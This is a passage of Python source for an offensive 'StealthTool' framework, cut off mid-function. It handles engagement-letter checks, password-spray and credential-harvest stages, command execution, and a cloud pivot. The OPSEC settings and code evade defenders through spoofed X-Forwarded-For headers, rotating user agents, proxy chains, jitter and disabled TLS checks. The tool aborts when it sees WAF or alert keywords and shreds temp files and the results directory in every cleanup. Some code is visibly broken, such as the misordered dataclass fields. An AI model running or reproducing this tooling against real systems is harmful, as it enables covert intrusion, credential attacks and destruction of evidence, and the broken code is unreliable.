import os
import json
import uuid
import datetime
import shutil
import re
import dns.resolver
import whois
import hashlib
import argparse
import yaml
import time
import csv
import random
import signal
import unicodedata
import pathlib
import threading
import getpass
import ipaddress
import socket
from typing import List, Dict, Any, Optional, Tuple, Set
from dataclasses import dataclass, field
import logging
import logging.handlers
import sys
import io
import base64
import subprocess
import asyncio
import aiohttp
import aiodns
import async_timeout
import aiofiles

try:
    from pypdf import PdfReader
except ImportError:
    PdfReader = None
try:
    import xml.etree.ElementTree as ET
except ImportError:
    ET = None
try:
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
    from Crypto.Util.Padding import pad, unpad
except ImportError:
    print("FATAL ERROR: pycryptodome not found. Install with 'pip install pycryptodome'.")
    sys.exit(1)
try:
    import socks
except ImportError:
    socks = None

# Custom Exceptions
class StealthToolError(Exception): pass
class ConfigurationError(StealthToolError): pass
class ToolExecutionError(StealthToolError): pass
class NetworkError(StealthToolError): pass
class DetectionError(StealthToolError): pass
class EncryptionError(StealthToolError): pass
class EngagementScopeError(StealthToolError): pass

# Regex Patterns
DYNAMIC_MASKING_PATTERNS = [
    re.compile(r"User-Agent:.*?\r\n", re.IGNORECASE | re.DOTALL),
    re.compile(r"X-Forwarded-For:.*?\r\n", re.IGNORECASE | re.DOTALL),
    re.compile(r"Cookie:.*?\r\n", re.IGNORECASE | re.DOTALL),
    re.compile(r"Set-Cookie:.*?\r\n", re.IGNORECASE | re.DOTALL),
    re.compile(r"Authorization:.*?\r\n", re.IGNORECASE | re.DOTALL),
]
SENSITIVE_PATTERNS = [
    re.compile(r"authorization\s*[:=]\s*?\S+", re.IGNORECASE),
    re.compile(r"x-ms-access-token\s*[:=]\s*?\S+", re.IGNORECASE),
    re.compile(r"password\s*[:=]\s*?.+?(?=\s|$|\"|\')", re.IGNORECASE),
    re.compile(r":::[^:]+:[^:]+:[^:]+:[^:]+(?::|$)", re.IGNORECASE),
    re.compile(r"NTLMv[12]\s+Response:\s*?\S+", re.IGNORECASE),
    re.compile(r"key\s*[:=]\s*?\S+", re.IGNORECASE),
    re.compile(r"secret\s*[:=]\s*?\S+", re.IGNORECASE),
    re.compile(r"private_key\s*[:=]\s*?.*?-----END.*?KEY-----", re.IGNORECASE | re.DOTALL),
    re.compile(r"rate\s*limit\s*exceeded", re.IGNORECASE),
]

# OPSEC Configuration
OPSEC_CONFIG = {
    "jitter_seconds": (0.5, 2.0),
    "low_and_slow": True,
    "low_and_slow_factor": 2.0,
    "proxy_chain": [],
    "user_agents": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0",
    ],
    "exit_on_detection": True,
    "detection_threshold": 2,
    "temp_file_encryption": "aes-256-cbc",
    "temp_file_cleanup_policy": "shred",
    "audit_log_encryption": "aes-256-cbc",
    "audit_log_key_management": "external",
    "command_execution_sandbox": False,
    "dns_over_https": True,
    "doh_resolvers": [
        "https://cloudflare-dns.com/dns-query",
        "https://dns.google/dns-query",
        "https://doh.opendns.com/dns-query"
    ],
    "network_timeout": 15.0,
    "connect_timeout": 7.0,
    "exclusion_list": [],
    "min_password_spray_attempts": 2,
    "lockout_wait_multiplier": 1.5,
    "scan_signature_profiling": True,
}

# Global State
ABORT_EVENT = threading.Event()
job_context: Optional['Job'] = None
event_loop: Optional[asyncio.AbstractEventLoop] = None

def signal_handler(signum, frame):
    """Handles signals for immediate shutdown."""
    ABORT_EVENT.set()
    stealth_logger.critical(f"[STEALTH] Signal {signum} received. Executing emergency shutdown.")
    if job_context and event_loop:
        asyncio.run_coroutine_threadsafe(
            job_context._log_audit({"event": "Emergency Shutdown", "signal": signum, "timestamp": str(datetime.datetime.now())}),
            event_loop
        ).result(timeout=5.0)
    if event_loop and event_loop.is_running():
        event_loop.call_soon_threadsafe(event_loop.stop)
    sys.exit(1)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

# Logging Setup
class StealthFormatter(logging.Formatter):
    """Redacts sensitive data from logs."""
    def format(self, record):
        record_copy = logging.makeLogRecord(record.__dict__)
        msg = record.getMessage()
        redacted = msg
        for pattern in DYNAMIC_MASKING_PATTERNS:
            redacted = pattern.sub(lambda m: f"{m.group(0).split(':')[0]}: ---MASKED---\r\n", redacted)
        for pattern in SENSITIVE_PATTERNS:
            redacted = pattern.sub("---REDACTED---", redacted)
        record_copy.msg = redacted
        try:
            return super().format(record_copy)
        finally:
            record_copy.msg = msg

LOG_LEVEL = logging.INFO
if os.getenv("DEBUG_STEALTH"):
    LOG_LEVEL = logging.DEBUG
logging.basicConfig(level=LOG_LEVEL, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
stealth_logger = logging.getLogger("StealthTool")
stealth_logger.handlers.clear()
console_handler = logging.StreamHandler(sys.stdout)
console_handler.setFormatter(StealthFormatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
stealth_logger.addHandler(console_handler)
stealth_logger.setLevel(LOG_LEVEL)

# Utilities
def contains_any(haystack: str, terms: Tuple[str]) -> bool:
    """Case-insensitive substring search."""
    hay = haystack.lower()
    return any(t.lower() in hay for t in terms)

def generate_secure_key(key_size: int = 32) -> bytes:
    """Generates a secure random key."""
    return get_random_bytes(key_size)

async def encrypt_data(data: bytes, key: bytes, iv: bytes) -> bytes:
    """Encrypts data with AES-256-CBC."""
    try:
        cipher = AES.new(key, AES.MODE_CBC, iv)
        padded_data = pad(data, AES.block_size)
        return cipher.encrypt(padded_data)
    except Exception as e:
        raise EncryptionError(f"Encryption failed: {e}") from e

async def decrypt_data(encrypted_data: bytes, key: bytes, iv: bytes) -> bytes:
    """Decrypts AES-256-CBC data."""
    try:
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_padded = cipher.decrypt(encrypted_data)
        return unpad(decrypted_padded, AES.block_size)
    except ValueError as e:
        raise EncryptionError(f"Decryption failed (padding error): {e}") from e
    except Exception as e:
        raise EncryptionError(f"Decryption failed: {e}") from e

async def shred_file_async(filepath: pathlib.Path, passes: int = 3):
    """Securely overwrites and deletes a file."""
    try:
        if not await aiofiles.os.path.exists(filepath):
            return
        file_size = (await aiofiles.os.stat(filepath)).st_size
        async with aiofiles.open(filepath, 'wb') as f:
            for _ in range(passes):
                await f.seek(0)
                await f.write(get_random_bytes(file_size))
                await f.flush()
        await aiofiles.os.remove(filepath)
        stealth_logger.debug(f"[STEALTH] Shredded file: {filepath}")
    except FileNotFoundError:
        pass
    except Exception as e:
        stealth_logger.warning(f"[STEALTH] Error shredding {filepath}: {e}")
        try:
            await aiofiles.os.remove(filepath)
        except Exception as e_unlink:
            stealth_logger.error(f"[STEALTH] FATAL: Failed to delete {filepath}: {e_unlink}")

# Data Classes
@dataclass
class Credential:
    username: str
    password: Optional[str] = field(default=None, repr=False)
    hash_nt: Optional[str] = field(default=None, repr=False)
    hash_lm: Optional[str] = field(default=None, repr=False)
    service: str
    type: str
    source: str
    mfa: Optional[bool] = None
    valid: bool = False
    privilege_level: str = "unknown"
    note: str = ""
    timestamp_found: str = field(default_factory=lambda: str(datetime.datetime.now()))
    validation_method: Optional[str] = None
    is_spray_candidate: bool = False
    is_hashcat_crack: bool = False

    def __post_init__(self):
        if self.type == "plaintext" and self.password:
            try:
                self.hash_nt = hashlib.new('md4', self.password.encode('utf-16le')).hexdigest().upper()
                self.hash_lm = "LM_HASH_SKIPPED"
                self.password = None
            except Exception:
                self.hash_nt = "HASH_CALC_ERROR"
        elif self.type == "hash" and self.password:
            hash_value = self.password.strip().upper()
            if len(hash_value) == 32 and re.fullmatch(r"[0-9A-F]{32}", hash_value):
                self.hash_nt = hash_value
            elif len(hash_value) == 64 and re.fullmatch(r"[0-9A-F]{64}", hash_value):
                self.hash_nt = f"SHA256:{hash_value}"
            else:
                self.hash_nt = f"UNKNOWN:{hash_value[:16]}..."
            self.password = None
            self.type = "hash"
        valid_privileges = {"unknown", "user", "admin", "domain_admin", "enterprise_admin", "global_admin", "service_account"}
        self.privilege_level = self.privilege_level.lower() if self.privilege_level.lower() in valid_privileges else "unknown"

    def to_dict(self, include_sensitive: bool = False):
        data = self.__dict__.copy()
        if not include_sensitive:
            data.pop('password', None)
        return data

@dataclass
class TargetInfo:
    root_domains: List[str]
    suspected_cloud_tenant: str
    cloud_tenant_status: str
    optional_targets: List[str]
    resolved_ips: List[str] = field(default_factory=list)
    potential_ad_hosts: List[str] = field(default_factory=list)
    domain_sid: str = ""
    forest_name: str = ""
    domain_controllers: List[str] = field(default_factory=list)
    domain_functional_level: str = ""
    verified: bool = False
    netbios_name: Optional[str] = None
    ad_domain_fqdn: Optional[str] = None
    m365_autodiscover: Optional[str] = None

@dataclass
class Job:
    uuid: str
    company: str
    testing_window: str
    engagement_letter_path: str
    timestamp_start: str
    timestamp_end: str = ""
    status: str = "initialized"
    target: TargetInfo = field(default_factory=lambda: TargetInfo([], "", "", []))
    recon_results: Dict[str, Any] = field(default_factory=dict)
    harvest_results: Dict[str, Any] = field(default_factory=dict)
    audit_log_path: str = ""
    results_dir: str = ""
    config: Dict[str, Any] = field(default_factory=dict)
    tool_cache: Dict[str, str] = field(default_factory=dict)
    rate_limit_state: Dict[str, float] = field(default_factory=dict)
    temp_dir: str = ""
    audit_log_key: bytes = field(repr=False, default=b'')
    audit_log_iv: bytes = field(repr=False, default=b'')
    temp_file_key: bytes = field(repr=False, default=b'')
    temp_file_iv: bytes = field(repr=False, default=b'')
    detection_indicators: List[Dict[str, Any]] = field(default_factory=list)
    opsec: Dict[str, Any] = field(default_factory=dict)
    async_session: Any = field(default=None, repr=False)
    async_dns_resolver: Any = field(default=None, repr=False)

    async def _log_audit(self, data: Dict[str, Any]):
        if ABORT_EVENT.is_set() or not self.audit_log_path or not self.audit_log_key:
            stealth_logger.error("[STEALTH] FATAL: Audit logging not configured.")
            try:
                redacted = self._redact_sensitive_data(data)
                stealth_logger.error(f"[STEALTH] Fallback audit: {json.dumps(redacted, default=str)}")
            except Exception as e:
                stealth_logger.critical(f"[STEALTH] FATAL: Fallback audit failed: {e}")
            return
        entry_iv = get_random_bytes(AES.block_size)
        redacted_data = self._redact_sensitive_data(data)
        try:
            plaintext = entry_iv + (json.dumps(redacted_data, default=str) + '\n').encode('utf-8')
            encrypted = await encrypt_data(plaintext, self.audit_log_key, entry_iv)
            async with aiofiles.open(self.audit_log_path, 'ab') as f:
                await f.write(encrypted)
        except Exception as e:
            stealth_logger.critical(f"[STEALTH] FATAL: Audit log write failed: {e}")

    def _redact_sensitive_data(self, data: Any) -> Any:
        if isinstance(data, dict):
            return {k: "---REDACTED_KEY---" if any(re.search(p, k, re.IGNORECASE) for p in SENSITIVE_PATTERNS) else self._redact_sensitive_data(v) for k, v in data.items()}
        elif isinstance(data, (list, tuple, set)):
            return [self._redact_sensitive_data(item) for item in data]
        elif isinstance(data, str):
            redacted = data
            for pattern in DYNAMIC_MASKING_PATTERNS + SENSITIVE_PATTERNS:
                redacted = pattern.sub("---REDACTED---", redacted)
            return redacted
        return data

    async def _check_for_detection(self):
        if self.opsec.get("exit_on_detection", True) and len(self.detection_indicators) >= self.opsec.get("detection_threshold", 2):
            reason = f"Detection threshold ({self.opsec['detection_threshold']}) exceeded."
            stealth_logger.critical(f"[STEALTH] {reason}")
            await self._abort_wizard(reason)

class StealthWizard:
    def __init__(self, config: Dict[str, Any], args: argparse.Namespace):
        self.config = config or {}
        self.args = args
        self.job: Optional[Job] = None
        self._temp_files: List[pathlib.Path] = []
        self.opsec = {**OPSEC_CONFIG, **self.config.get("opsec", {})}
        stealth_logger.setLevel(LOG_LEVEL)

    async def run(self):
        """Executes the pentesting stages with ruthless precision."""
        global event_loop
        try:
            event_loop = asyncio.get_running_loop()
            stealth_logger.debug("[STEALTH] Locked onto existing event loop.")
        except RuntimeError:
            event_loop = asyncio.new_event_loop()
            asyncio.set_event_loop(event_loop)
            stealth_logger.debug("[STEALTH] Forged new event loop.")

        try:
            stealth_logger.info("[STEALTH] Initiating breach protocol...")
            if await self.gatekeeper():
                global job_context
                job_context = self.job
                if await self.target_definition():
                    if await self.recon_surface_mapping():
                        if self.job.status != "halted_after_recon":
                            if await self.credential_harvest_spray():
                                if await self.cloud_pivot():
                                    stealth_logger.info("[STEALTH] All targets compromised. Awaiting exfil orders.")
                                else:
                                    stealth_logger.warning("[STEALTH] Cloud pivot failed. Perimeter breach incomplete.")
                            else:
                                stealth_logger.warning("[STEALTH] Credential harvest failed. Breach stalled.")
                        else:
                            stealth_logger.warning("[STEALTH] Recon halted: AD confidence too low.")
                    else:
                        stealth_logger.warning("[STEALTH] Recon failed. Target remains unexposed.")
                else:
                    stealth_logger.warning("[STEALTH] Target definition failed. No viable attack surface.")
            else:
                stealth_logger.warning("[STEALTH] Gatekeeper denied access. Operation aborted.")
            if self.job and self.job.status == "running":
                self.job.status = "completed"
                self.job.timestamp_end = str(datetime.datetime.now())
                stealth_logger.info("[STEALTH] Mission completed. All systems green.")
        except Exception as e:
            stealth_logger.critical(f"[STEALTH] FATAL: Unhandled breach failure: {e}", exc_info=True)
            if self.job:
                await self.job._log_audit({"event": "Critical Failure", "error": str(e), "traceback": traceback.format_exc(), "timestamp": str(datetime.datetime.now())})
                self.job.status = "failed"
                self.job.timestamp_end = str(datetime.datetime.now())
        finally:
            stealth_logger.info("[STEALTH] Executing cleanup protocol...")
            await self._cleanup_temp_files()
            await self._secure_cleanup_results()
            if self.job and self.job.async_session:
                await self.job.async_session.close()
            if self.job:
                await self.job._log_audit({"event": "Operation Terminated", "status": self.job.status, "timestamp": str(datetime.datetime.now())})
                stealth_logger.info(f"[STEALTH] Operation UUID: {self.job.uuid} | Status: {self.job.status} | Audit Log: {self.job.audit_log_path}")
                if self.job.detection_indicators:
                    stealth_logger.warning(f"[STEALTH] {len(self.job.detection_indicators)} detection indicators observed:")
                    for ind in self.job.detection_indicators:
                        stealth_logger.warning(f"  - {ind.get('message', 'Unknown')} (Source: {ind.get('source', 'Unknown')})")

    async def _get_tool_path(self, tool_name: str) -> Optional[pathlib.Path]:
        """Locates a tool or terminates the operation."""
        if ABORT_EVENT.is_set():
            return None
        if self.job and tool_name in self.job.tool_cache:
            return pathlib.Path(self.job.tool_cache[tool_name])
        tool_paths = self.config.get("tool_paths", {})
        candidates = tool_paths.get(tool_name, [tool_name])
        if isinstance(candidates, str):
            candidates = [candidates]
        for candidate in candidates:
            try:
                path = await asyncio.get_running_loop().run_in_executor(None, shutil.which, candidate)
                if path:
                    resolved_path = pathlib.Path(path).resolve()
                    if self.job:
                        self.job.tool_cache[tool_name] = str(resolved_path)
                    stealth_logger.debug(f"[STEALTH] Tool located: {tool_name} at {resolved_path}")
                    return resolved_path
            except Exception:
                pass
        stealth_logger.critical(f"[STEALTH] FATAL: Tool '{tool_name}' not found.")
        if self.job:
            await self.job._log_audit({"event": "Tool Missing", "tool": tool_name, "timestamp": str(datetime.datetime.now())})
            await self._abort_wizard(f"Tool '{tool_name}' not found.")
        return None

    async def _create_directories(self, path: pathlib.Path) -> bool:
        """Creates secure directories or aborts."""
        if ABORT_EVENT.is_set():
            return False
        try:
            await aiofiles.os.makedirs(path, mode=0o700, exist_ok=True)
            stealth_logger.debug(f"[STEALTH] Secured directory: {path}")
            return True
        except Exception as e:
            stealth_logger.critical(f"[STEALTH] FATAL: Directory creation failed for {path}: {e}")
            if self.job:
                await self.job._log_audit({"event": "Directory Creation Failure", "directory": str(path), "error": str(e), "timestamp": str(datetime.datetime.now())})
            return False

    async def _write_temp_file(self, content: bytes, prefix: str = "tmp", suffix: str = "") -> Optional[pathlib.Path]:
        """Writes encrypted temp file or aborts."""
        if ABORT_EVENT.is_set() or not self.job or not self.job.temp_dir or not self.job.temp_file_key:
            stealth_logger.critical("[STEALTH] FATAL: Temp file encryption not configured.")
            return None
        try:
            temp_dir = pathlib.Path(self.job.temp_dir)
            if not await self._create_directories(temp_dir):
                return None
            temp_file = temp_dir / f"{prefix}_{uuid.uuid4()}{suffix}.enc"
            file_iv = get_random_bytes(AES.block_size)
            encrypted = await encrypt_data(content, self.job.temp_file_key, file_iv)
            final_content = file_iv + encrypted
            async with aiofiles.open(temp_file, 'wb') as f:
                await f.write(final_content)
            self._temp_files.append(temp_file)
            stealth_logger.debug(f"[STEALTH] Encrypted temp file created: {temp_file}")
            if self.job:
                await self.job._log_audit({"event": "Temp File Created", "file": str(temp_file), "timestamp": str(datetime.datetime.now())})
            return temp_file
        except Exception as e:
            stealth_logger.critical(f"[STEALTH] FATAL: Temp file write failed: {e}")
            if self.job:
                await self.job._log_audit({"event": "Temp File Write Failure", "error": str(e), "timestamp": str(datetime.datetime.now())})
            return None

    async def _read_temp_file(self, filepath: pathlib.Path) -> Optional[bytes]:
        """Reads and decrypts temp file or aborts."""
        if ABORT_EVENT.is_set() or not await aiofiles.os.path.exists(filepath) or not self.job or not self.job.temp_file_key:
            return None
        try:
            async with aiofiles.open(filepath, 'rb') as f:
                content = await f.read()
            iv_size = AES.block_size
            if len(content) < iv_size:
                raise EncryptionError("File too short for IV.")
            file_iv, encrypted = content[:iv_size], content[iv_size:]
            plaintext = await decrypt_data(encrypted, self.job.temp_file_key, file_iv)
            stealth_logger.debug(f"[STEALTH] Decrypted temp file: {filepath}")
            return plaintext
        except Exception as e:
            stealth_logger.critical(f"[STEALTH] FATAL: Temp file read failed: {e}")
            if self.job:
                await self.job._log_audit({"event": "Temp File Read Failure", "file": str(filepath), "error": str(e), "timestamp": str(datetime.datetime.now())})
            return None

    async def _execute_command(self, command: List[str], cwd: Optional[pathlib.Path] = None, timeout: Optional[float] = None, quiet: bool = True) -> Tuple[bytes, bytes]:
        """Executes a command with surgical precision."""
        if ABORT_EVENT.is_set():
            return b"", b""
        command_copy = command[:]
        audit_start = datetime.datetime.now()
        executable_path = await self._get_tool_path(command_copy[0])
        if not executable_path:
            raise ToolExecutionError(f"Tool {command_copy[0]} not found.")
        command_copy[0] = str(executable_path)
        if self.opsec.get("command_execution_sandbox", False):
            sandbox_tool = await asyncio.get_running_loop().run_in_executor(None, shutil.which, "firejail")
            if sandbox_tool:
                command_copy = [sandbox_tool, "--quiet", "--noprofile", "--nodbus", "--nolog", "--private=.", "--", *command_copy]
            else:
                stealth_logger.warning("[STEALTH] Sandboxing enabled but firejail missing.")
        env = os.environ.copy()
        if self.opsec.get("proxy_chain"):
            proxy = random.choice(self.opsec["proxy_chain"])
            if "http" in proxy.lower():
                env['HTTP_PROXY'] = env['HTTPS_PROXY'] = proxy
            elif "socks" in proxy.lower():
                env['ALL_PROXY'] = proxy
            env['NO_PROXY'] = ",".join(["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "127.0.0.1/8"] + self.opsec.get("exclusion_list", []))
        log_command = ["---REDACTED_ARG---" if isinstance(arg, str) and any(re.search(p, arg, re.IGNORECASE) for p in SENSITIVE_PATTERNS) else str(arg) for arg in command_copy]
        stealth_logger.info(f"[STEALTH] Executing: {' '.join(log_command)}")
        stdout_bytes, stderr_bytes = b"", b""
        returncode = -1
        process = None
        try:
            process = await asyncio.create_subprocess_exec(
                *command_copy, cwd=str(cwd) if cwd else None, stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE, env=env
            )
            async with async_timeout.timeout(timeout or self.opsec.get("network_timeout", 15.0)):
                stdout_bytes, stderr_bytes = await process.communicate()
            returncode = process.returncode
            if not quiet:
                stealth_logger.debug(f"[STEALTH] Stdout: {stdout_bytes[:500].decode('utf-8', errors='ignore')}...")
                stealth_logger.debug(f"[STEALTH] Stderr: {stderr_bytes[:500].decode('utf-8', errors='ignore')}...")
        except FileNotFoundError as e:
            raise ToolExecutionError(f"Tool not found: {e}") from e
        except asyncio.TimeoutError:
            stealth_logger.error(f"[STEALTH] Command timed out after {timeout}s: {' '.join(log_command)}")
            if process and process.returncode is None:
                process.terminate()
                try:
                    await asyncio.wait_for(process.wait(), timeout=5.0)
                except:
                    process.kill()
            raise ToolExecutionError(f"Command timed out after {timeout}s.") from None
        except Exception as e:
            stealth_logger.error(f"[STEALTH] Command execution failed: {e}")
            if process and process.returncode is None:
                process.terminate()
                try:
                    await asyncio.wait_for(process.wait(), timeout=5.0)
                except:
                    process.kill()
            raise ToolExecutionError(str(e)) from e
        finally:
            if process and process.returncode is None:
                process.kill()
            if self.job:
                await self.job._log_audit({
                    "event": "Command Executed", "command": ' '.join(log_command),
                    "output_preview": stdout_bytes[:500].decode('utf-8', errors='ignore'),
                    "error_preview": stderr_bytes[:500].decode('utf-8', errors='ignore'),
                    "returncode": returncode, "timestamp_start": str(audit_start),
                    "timestamp_end": str(datetime.datetime.now())
                })
        detection_indicators = []
        stderr_str = stderr_bytes.decode('utf-8', errors='ignore')
        stdout_str = stdout_bytes.decode('utf-8', errors='ignore')
        if contains_any(stderr_str, ("alert", "detection", "block", "quarantine", "access denied", "firewall", "rate limit")):
            detection_indicators.append({"message": "Security control detected", "source": f"Stderr: {stderr_str[:100]}"})
        if contains_any(stdout_str, ("alert", "detection", "block", "quarantine", "rate limit")):
            detection_indicators.append({"message": "Security control detected", "source": f"Stdout: {stdout_str[:100]}"})
        self.job.detection_indicators.extend(detection_indicators)
        await self._check_for_detection()
        return stdout_bytes, stderr_bytes

    async def _execute_async_request(self, method: str, url: str, headers: Optional[Dict[str, str]] = None, data: Optional[Any] = None, json: Optional[Dict[str, Any]] = None, timeout: Optional[float] = None, allow_redirects: bool = True) -> Optional[aiohttp.ClientResponse]:
        """Executes HTTP request with stealth."""
        if ABORT_EVENT.is_set() or not aiohttp or not self.job.async_session:
            stealth_logger.error("[STEALTH] Async HTTP not available.")
            return None
        request_headers = headers or {}
        request_headers.setdefault('User-Agent', random.choice(self.opsec.get("user_agents", ["StealthTool/1.0"])))
        request_headers.setdefault('Referer', f"https://{self.job.target.root_domains[0] if self.job.target.root_domains else 'example.com'}/")
        request_headers.setdefault('X-Forwarded-For', f"192.168.1.{random.randint(1, 254)}")
        proxy = random.choice(self.opsec.get("proxy_chain")) if self.opsec.get("proxy_chain") else None
        try:
            async with async_timeout.timeout(timeout or self.opsec.get("network_timeout", 15.0)):
                stealth_logger.debug(f"[STEALTH] HTTP {method} {url} (Proxy: {'Yes' if proxy else 'No'})")
                async with self.job.async_session.request(
                    method, url, headers=request_headers, data=data, json=json, proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=timeout or self.opsec.get("network_timeout", 15.0), connect=self.opsec.get("connect_timeout", 7.0)),
                    allow_redirects=allow_redirects, verify_ssl=False
                ) as response:
                    detection_indicators = []
                    if response.status >= 400 or contains_any(str(response.headers).lower(), ("waf", "block", "captcha", "rate limit")):
                        detection_indicators.append({"message": f"HTTP status {response.status} or control headers", "source": f"Headers: {str(response.headers)[:100]}", "url": url})
                    try:
                        body_preview = (await response.text()).lower()[:500]
                        if contains_any(body_preview, ("blocked", "access denied", "captcha", "rate limit")):
                            detection_indicators.append({"message": "Control text in body", "source": f"Body: {body_preview[:100]}", "url": url})
                    except Exception:
                        pass
                    self.job.detection_indicators.extend(detection_indicators)
                    await self._check_for_detection()
                    return response
        except aiohttp.ClientError as e:
            stealth_logger.error(f"[STEALTH] HTTP request failed: {e}")
            if contains_any(str(e).lower(), ("connection refused", "timed out", "rate limit")):
                self.job.detection_indicators.append({"message": "HTTP failure, possible block", "source": f"ClientError: {str(e)[:100]}", "url": url})
                await self._check_for_detection()
            return None
        except async_timeout.TimeoutError:
            stealth_logger.error(f"[STEALTH] HTTP request timed out: {url}")
            self.job.detection_indicators.append({"message": "HTTP timeout", "source": "Timeout", "url": url})
            await self._check_for_detection()
            return None
        except Exception as e:
            stealth_logger.critical(f"[STEALTH] FATAL: HTTP request crashed: {e}")
            return None

    async def _abort_wizard(self, reason: str = "Unknown reason"):
        """Terminates operation with extreme prejudice."""
        if ABORT_EVENT.is_set():
            return
        ABORT_EVENT.set()
        stealth_logger.critical(f"[STEALTH] OPERATION TERMINATED: {reason}")
        if self.job:
            self.job.status = "aborted"
            self.job.timestamp_end = str(datetime.datetime.now())
            await self.job._log_audit({"event": "Operation Aborted", "reason": reason, "timestamp": str(datetime.datetime.now())})
        await self._cleanup_temp_files()
        await self._secure_cleanup_results()
        if self.job and self.job.async_session:
            await self.job.async_session.close()
        if event_loop and event_loop.is_running():
            event_loop.stop()
        sys.exit(1)

    async def _cleanup_temp_files(self):
        """Erases all traces of temp files."""
        cleanup_policy = self.opsec.get("temp_file_cleanup_policy", "shred").lower()
        tasks = []
        for temp_file in self._temp_files[:]:
            if await aiofiles.os.path.exists(temp_file):
                tasks.append(shred_file_async(temp_file) if cleanup_policy == "shred" else aiofiles.os.remove(temp_file))
            try:
                self._temp_files.remove(temp_file)
            except ValueError:
                pass
        await asyncio.gather(*tasks, return_exceptions=True)
        stealth_logger.debug(f"[STEALTH] Temp files eradicated: {len(tasks)}")

    async def _secure_cleanup_results(self):
        """Wipes results directory clean."""
        if not self.job or not self.job.results_dir:
            return
        results_dir = pathlib.Path(self.job.results_dir)
        if not await aiofiles.os.path.exists(results_dir):
            return
        cleanup_policy = self.opsec.get("temp_file_cleanup_policy", "shred").lower()
        tasks = []
        try:
            for root, _, files in await asyncio.get_running_loop().run_in_executor(None, lambda: list(os.walk(results_dir, topdown=False))):
                for name in files:
                    filepath = pathlib.Path(root) / name
                    if await aiofiles.os.path.exists(filepath):
                        tasks.append(shred_file_async(filepath) if cleanup_policy == "shred" else aiofiles.os.remove(filepath))
                for name in _:
                    dirpath = pathlib.Path(root) / name
                    try:
                        await aiofiles.os.rmdir(dirpath)
                    except Exception:
                        pass
            await asyncio.gather(*tasks, return_exceptions=True)
            try:
                await aiofiles.os.rmdir(results_dir)
                stealth_logger.info(f"[STEALTH] Results directory annihilated: {results_dir}")
            except Exception:
                stealth_logger.error(f"[STEALTH] Failed to remove results directory: {results_dir}")
        except Exception as e:
            stealth_logger.error(f"[STEALTH] Cleanup error: {e}")

    async def _read_file_bytes(self, filepath: pathlib.Path) -> bytes:
        """Reads file content as bytes."""
        if not await aiofiles.os.path.exists(filepath):
            raise FileNotFoundError(f"File not found: {filepath}")
        async with aiofiles.open(filepath, 'rb') as f:
            return await f.read()

    def _is_valid_ip(self, target: str) -> bool:
         """Validates if target is an IPv4 or IPv6 address."""
         try:
              ipaddress.ip_address(target)
              return True
         except ValueError:
              return False

    async def gatekeeper(self) -> bool:
        """Enforces strict access control."""
        stealth_logger.info("[STEALTH] --- Gatekeeper: Authorization Required ---")
        el_path = pathlib.Path(self.args.engagement_letter).resolve()
        if not await aiofiles.os.path.isfile(el_path) or el_path.suffix.lower() != ".pdf":
            await self._abort_wizard(f"Invalid engagement letter: {el_path}")
        base_dir = pathlib.Path(self.config.get("results_directory", "results")).resolve()
        results_dir = base_dir / self.args.run_uuid
        audit_log_dir = results_dir / "audit_logs"
        output_dir = results_dir / "output"
        temp_dir = results_dir / "temp"
        for dir_path in [base_dir, results_dir, audit_log_dir, output_dir, temp_dir]:
            if not await self._create_directories(dir_path):
                await self._abort_wizard(f"Directory creation failed: {dir_path}")
        audit_log_path = audit_log_dir / f"{self.args.run_uuid}.audit.log.enc"
        audit_log_key, temp_file_key = generate_secure_key(), generate_secure_key()
        self.job = Job(
            uuid=self.args.run_uuid, company=self.args.company_name, testing_window=self.args.testing_window,
            engagement_letter_path=str(el_path), timestamp_start=str(datetime.datetime.now()),
            audit_log_path=str(audit_log_path), results_dir=str(results_dir), temp_dir=str(temp_dir),
            config=self.config, audit_log_key=audit_log_key, temp_file_key=temp_file_key,
            opsec=self.opsec
        )
        self.job.async_session = aiohttp.ClientSession(
            headers={'User-Agent': random.choice(self.opsec["user_agents"])},
            connector=aiohttp.TCPConnector(limit=100, enable_cleanup_closed=True)
        )
        if aiodns:
            self.job.async_dns_resolver = aiodns.DNSResolver(loop=event_loop)
        await self.job._log_audit({"event": "Operation Initiated", "uuid": self.job.uuid, "operator": getpass.getuser(), "timestamp": str(datetime.datetime.now())})
        try:
            pdf_bytes = await self._read_file_bytes(el_path)
            letter_text = ""
            if PdfReader:
                try:
                    reader = PdfReader(io.BytesIO(pdf_bytes))
                    letter_text = "".join(page.extract_text() or "" for page in reader.pages)
                except Exception as e:
                    stealth_logger.warning(f"[STEALTH] PdfReader failed: {e}")
            if not letter_text:
                pdftotext = await self._get_tool_path('pdftotext')
                if pdftotext:
                    temp_pdf = await self._write_temp_file(pdf_bytes, suffix=".pdf")
                    stdout_bytes, stderr_bytes = await self._execute_command([str(pdftotext), str(temp_pdf), '-'], quiet=True)
                    if stderr_bytes:
                        stealth_logger.warning(f"[STEALTH] pdftotext error: {stderr_bytes.decode('utf-8', errors='ignore')[:100]}")
                    letter_text = stdout_bytes.decode('utf-8', errors='ignore')
            if not letter_text.strip():
                await self._abort_wizard("No readable text in engagement letter.")
            if unicodedata.normalize('NFKD', self.job.company).casefold() not in unicodedata.normalize('NFKD', letter_text).casefold():
                await self._abort_wizard(f"Company name '{self.job.company}' not found in engagement letter.")
        except Exception as e:
            await self._abort_wizard(f"Engagement letter validation failed: {e}")
        self.job.status = "running"
        stealth_logger.info("[STEALTH] Gatekeeper passed. Breach authorized.")
        return True

    async def _resolve_domains_to_ips(self, domains: List[str]) -> List[str]:
        """Resolves domains to IPs with stealth."""
        resolved_ips = []
        use_doh = self.opsec.get("dns_over_https", False) and self.job.async_session
        resolvers = self.opsec.get("doh_resolvers", []) if use_doh else []
        async def doh_lookup(domain, resolver):
            try:
